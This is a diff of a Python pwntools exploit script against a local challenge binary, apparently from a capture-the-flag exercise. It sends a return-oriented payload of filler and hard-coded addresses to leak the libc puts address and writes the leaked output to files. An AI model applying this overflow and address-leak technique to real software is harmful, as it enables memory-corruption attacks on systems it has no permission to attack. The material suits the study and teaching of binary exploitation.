@@ -4,14 +4,14 @@ import time
 
 import sys
 
-target = process("./combo-chain")
-gdb.attach(target)
+target = process("./chall")
+gdb.attach(target, gdbscript="get_libc_puts_address")
 
 payload = ""
-payload += "0000000000000000"
-payload += p64(0x401263)
-payload += p64(0x404030)
-payload += p64(0x401050)
+payload += "000000000000000000"
+payload += p64(0x401273)
+payload += p64(0x404018)
+payload += p64(0x401030)
 target.sendline(payload)
 foundEnd = False
 output = ""
@@ -26,13 +26,11 @@ if len(output) == 0:
 	outputFile.close()
 	sys.exit(0)
 time.sleep(1)
-
-'''
-#putsFile = open("far-cry", "r")
-#putsAddress = putsFile.read()
-#putsFile.close()
-#putsAddress = int(putsAddress, 16)
-#outputLines = output.split("\n")
+putsFile = open("far-cry", "r")
+putsAddress = putsFile.read()
+putsFile.close()
+putsAddress = int(putsAddress, 16)
+outputLines = output.split("\n")
 if len(outputLines) == 1:
 	leakLine = outputLines[0]
 else:
@@ -53,10 +51,6 @@ finalFillerOutput = leakLine[:-savedIndex]
 fillerOutput = outputLines[:-2]
 fillerOutput.append(finalFillerOutput)
 fillerOutput = "\\n".join(fillerOutput)
-
-print("Filler output is: %s" % str(fillerOutput))
-#outputFile = open("justifies", "w")
-#outputFile.write(fillerOutput)
-#outputFile.close()
-'''
-target.interactive()
+outputFile = open("justifies", "w")
+outputFile.write(fillerOutput)
+outputFile.close()
